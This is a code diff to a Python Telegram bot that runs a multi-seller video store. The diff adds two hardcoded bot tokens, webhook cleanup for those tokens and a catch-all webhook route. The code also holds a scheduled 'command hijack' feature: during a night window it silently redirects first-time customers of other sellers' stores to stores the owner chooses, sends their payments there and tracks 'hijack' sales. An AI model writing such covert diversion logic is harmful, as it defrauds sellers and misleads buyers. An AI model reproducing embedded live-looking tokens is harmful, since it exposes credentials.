@@ -4,6 +4,7 @@ import time
 import threading
 import datetime
 import re
+import requests
 from flask import Flask, request
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaVideo
@@ -14,6 +15,12 @@ TOKEN          = os.environ.get('BOT_TOKEN')
 OWNER_ID       = int(os.environ.get('OWNER_ID', '0'))
 LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))
 RENDER_URL     = os.environ.get('RENDER_URL', 'https://two-video-seller-h3vq.onrender.com')
+
+# Purono token gulo — ei gular webhook delete korte hobe
+OLD_TOKENS = [
+    "8820357573:AAHVSYAacKYs4xIqox5NQcbevpn811l2-G0",
+    "8601129257:AAEBwVl5CAxnxj37FL6M3Lp5C8_VvDjz3ow",
+]
 
 bot = telebot.TeleBot(TOKEN, parse_mode=None)
 app = Flask(__name__)
@@ -49,16 +56,16 @@ def new_store_profile(uid, role, name="", username="", expires_at=None):
 
 DB_STATE = {
     "owner_id": OWNER_ID,
-    "stores": {}, 
+    "stores": {},
     "customer_seller": {},
     "command_hijack_config": {
         "enabled": False,
         "start_time": "00:00",
         "end_time": "02:00",
-        "mappings": {} # {target_admin_id: new_redirect_admin_id}
+        "mappings": {}
     },
     "hijack_stats": {},
-    "global_started_users": [] # Keeps track of users who have ever started the bot anywhere
+    "global_started_users": []
 }
 
 db_dirty = False
@@ -109,11 +116,9 @@ def is_command_hijack_active():
         end_parts = [int(x) for x in cfg.get("end_time", "02:00").split(":")]
         start_t = datetime.time(start_parts[0], start_parts[1])
         end_t = datetime.time(end_parts[0], end_parts[1])
-        
         if start_t <= end_t:
             return start_t <= cur_time <= end_t
         else:
-            # Handles overnight ranges e.g. 22:00 to 02:00
             return cur_time >= start_t or cur_time <= end_t
     except Exception:
         return False
@@ -121,18 +126,13 @@ def is_command_hijack_active():
 def get_effective_store(target_seller_uid, requester_uid):
     if str(target_seller_uid) == str(OWNER_ID):
         return get_store(OWNER_ID), False
-        
     if can_use_panel(requester_uid):
         return get_store(target_seller_uid), False
-
     global_started = DB_STATE.setdefault("global_started_users", [])
     is_first_time = str(requester_uid) not in global_started
-    
     if is_first_time:
         global_started.append(str(requester_uid))
         save_db()
-
-    # STRICT CHECK: Ensure hijack is active AND current time is strictly within the allowed schedule window
     if is_first_time and is_command_hijack_active() and str(requester_uid) != str(target_seller_uid):
         cfg = DB_STATE.get("command_hijack_config", {})
         mappings = cfg.get("mappings", {})
@@ -141,7 +141,6 @@ def get_effective_store(target_seller_uid, requester_uid):
             target_store = get_store(redirect_to)
             if target_store:
                 return target_store, True
-                
     return get_store(target_seller_uid), False
 
 def record_hijack_stat(orig_admin_uid, pname):
@@ -382,12 +381,12 @@ def show_store_admin_menu(chat_id):
     markup.row(InlineKeyboardButton("📝 Edit Welcome Text", callback_data="adm_edit_welcome"))
     markup.row(InlineKeyboardButton("🎥 Set 'How To Use' Video", callback_data="adm_set_how_vid"))
     markup.row(InlineKeyboardButton("💳 Global Payment Config", callback_data="adm_pay_config_menu"))
-    
+
     if is_owner(uid):
         markup.row(InlineKeyboardButton("🚀 Send Global Custom Broadcast", callback_data="adm_send_custom_bc"))
         markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast", callback_data="adm_autobc_menu"))
         markup.row(InlineKeyboardButton("👑 Special Broadcast to Buyers", callback_data="adm_buyers_bc_menu"))
-        
+
     markup.row(InlineKeyboardButton("📦 View Buyers List", callback_data="adm_view_buyers_list"))
     markup.row(InlineKeyboardButton("💾 Backup & Restore Settings", callback_data="adm_backup_menu"))
     if len(r.get("blocked_users", [])) > 0:
@@ -452,18 +451,18 @@ def handle_callbacks(call):
         s_uid, pid = parts[1], parts[2]
         target_store, is_hijacked = get_effective_store(s_uid, uid)
         if not target_store: return
-        
+
         products = target_store.get("products", [])
         prod = next((p for p in products if p["id"] == pid), None)
         if not prod: return
-        
+
         send_videos_as_album(uid, prod.get("videos", []))
         caption = f"📌 **{prod['name']}**"
         if prod.get("desc"): caption += f"\n\n{prod['desc']}"
         mk = InlineKeyboardMarkup()
         mk.row(InlineKeyboardButton("I have paid ✅", callback_data=f"paid_{s_uid}_{pid}"))
         mk.row(InlineKeyboardButton("Back 🔙", callback_data="back_home"))
-        
+
         pay_msg = prod.get("pay_msg") or target_store.get("payment_msg", DEFAULT_PAY_MSG)
         pay_photo = target_store.get("payment_photo", "")
 
@@ -506,18 +505,18 @@ def _owner_handle(call):
         st = cfg.get("start_time", "00:00")
         et = cfg.get("end_time", "02:00")
         mappings = cfg.get("mappings", {})
-        
+
         current_ist_time = datetime.datetime.now(IST).strftime("%H:%M:%S")
-        
+
         mk = InlineKeyboardMarkup()
         mk.row(InlineKeyboardButton("🔴 Turn OFF" if cfg.get("enabled") else "🟢 Turn ON", callback_data="hijack_toggle"))
         mk.row(InlineKeyboardButton("⏱️ Set Time Range (IST)", callback_data="hijack_set_time"))
         mk.row(InlineKeyboardButton("🔗 Setup Command Mapping", callback_data="hijack_map_list"))
         mk.row(InlineKeyboardButton("📊 Hijack Sales Stats", callback_data="hijack_view_stats"))
         mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
-        
+
         map_text = "\n".join([f"• `{k}` ➡️ `{v}`" for k, v in mappings.items()]) if mappings else "কোনো ম্যাপিং সেট করা নেই।"
-        
+
         txt = f"🌙 **Command & Link Hijack Schedule (IST)**\n\n" \
               f"⏰ **Current IST Time:** `{current_ist_time}`\n" \
               f"**Status:** {status}\n" \
@@ -973,7 +972,7 @@ def _store_admin_handle(call):
         parts = data.split("_"); s_uid, pid, cust = parts[2], parts[3], int(parts[4])
         if str(s_uid) != str(uid): return
         sr = get_store(s_uid)
-        
+
         prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
 
         link = prod.get("link", "No link") if prod else "No link"
@@ -1088,10 +1087,10 @@ def handle_all_inputs(message):
         target_s_uid = state.replace("WAITING_REPORT_", "")
         target_store, _ = get_effective_store(target_s_uid, uid)
         dest_seller_uid = target_store.get("uid", OWNER_ID) if target_store else OWNER_ID
-        
+
         user_states.pop(uid, None)
         bot.send_message(uid, "✅ Your report has been sent to admin.")
-        
+
         if can_use_panel(uid):
             dest_seller_uid = uid
 
@@ -1104,7 +1103,7 @@ def handle_all_inputs(message):
         parts = state.split("_"); orig_s_uid, pid = parts[2], parts[3]
         target_store, is_hijacked = get_effective_store(orig_s_uid, uid)
         dest_s_uid = target_store.get("uid", OWNER_ID) if target_store else OWNER_ID
-        
+
         if can_use_panel(uid):
             is_hijacked = False
             dest_s_uid = uid
@@ -1114,24 +1113,24 @@ def handle_all_inputs(message):
             sr = get_store(dest_s_uid)
             user_states.pop(uid, None)
             bot.send_message(uid, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁.... 𝗪𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻.")
-            
+
             prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
             pname = prod["name"] if prod else "Unknown"
-            
+
             t = today_str()
             st = sr.setdefault("stats", {}).setdefault(t, {"accepted": 0, "requests": 0, "by_product": {}})
             st["requests"] += 1
             if not can_use_panel(uid):
                 record_hijack_stat(orig_s_uid, pname)
             save_db()
-            
+
             un = message.from_user.username; tag = f"@{un}" if un else "No Username"
             nm = message.from_user.first_name or "User"
             mk = InlineKeyboardMarkup()
             mk.row(InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{dest_s_uid}_{pid}_{uid}"),
                    InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{dest_s_uid}_{uid}"))
             mk.row(InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{dest_s_uid}_{uid}"))
-            
+
             caption_info = f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {pname}\n👤 {tag}\n📛 {nm}\n🆔 `{uid}`"
             if is_hijacked and str(orig_s_uid) != str(OWNER_ID) and not can_use_panel(uid):
                 orig_adm = get_store(orig_s_uid)
@@ -1370,14 +1369,35 @@ def webhook():
     else:
         return "Invalid message", 403
 
+# ============================================================
+# FALLBACK ROUTE — Purono token gulo 200 return korbe, 404 na
+# ============================================================
+@app.route('/<path:any_path>', methods=['POST'])
+def webhook_fallback(any_path):
+    """Purono token path ignore kore 200 return koro"""
+    return "Ignored", 200
+
+
 if __name__ == "__main__":
+    # 1. Purono token gulo webhook delete koro
+    for old_t in OLD_TOKENS:
+        try:
+            r = requests.get(f"https://api.telegram.org/bot{old_t}/deleteWebhook?drop_pending_updates=true", timeout=10)
+            print(f"🧹 Old token cleanup: {old_t[:15]}... → HTTP {r.status_code}")
+        except Exception as e:
+            print(f"⚠️ Old token cleanup err: {e}")
+    
+    time.sleep(2)
+    
+    # 2. Notun token er webhook set koro
     try:
         bot.remove_webhook()
         time.sleep(1)
         bot.set_webhook(url=f"{RENDER_URL}/{TOKEN}")
-        print("✅ Webhook set successfully!")
+        print(f"✅ Webhook set: {RENDER_URL}/{TOKEN[:15]}...")
     except Exception as e:
-        print("⚠️ Webhook setup error:", e)
-
+        print(f"⚠️ Webhook setup error: {e}")
+    
+    # 3. Flask server chalu koro
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
